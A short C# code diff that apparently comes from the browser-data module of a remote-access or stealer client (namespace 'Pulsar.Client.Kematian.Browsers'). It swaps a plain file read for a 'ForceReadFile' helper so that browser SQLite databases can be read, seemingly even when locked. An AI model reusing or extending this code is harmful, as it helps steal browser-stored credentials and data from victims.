@@ -20,7 +20,11 @@ namespace Pulsar.Client.Kematian.Browsers.Helpers.SQL
         {
             if (File.Exists(baseName))
             {
-                db_bytes = File.ReadAllBytes(baseName);
+                db_bytes = FileHandlerXeno.ForceReadFile(baseName);
+                if (db_bytes == null)
+                {
+                    throw new Exception("Unable to read SQLite Database File");
+                }
                 if (Encoding.Default.GetString(db_bytes, 0, 15).CompareTo("SQLite format 3") != 0)
                 {
                     throw new Exception("Not a valid SQLite 3 Database File");
